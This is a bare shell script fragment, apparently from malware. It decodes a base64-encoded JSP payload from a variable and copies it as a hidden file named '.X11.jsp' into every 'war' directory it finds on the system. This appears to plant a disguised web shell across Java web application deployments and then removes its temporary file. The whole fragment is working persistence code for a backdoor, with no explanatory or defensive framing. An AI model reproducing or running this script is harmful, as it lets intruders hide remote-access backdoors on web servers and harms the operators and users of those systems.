tmpFl=`mktemp`
echo $B64Jsp|base64 -d>$tmpFl
find / -type d -name "war" 2>/dev/null|xargs -I {} cp -f $tmpFl {}/.X11.jsp;
rm -rf $tmpFl;
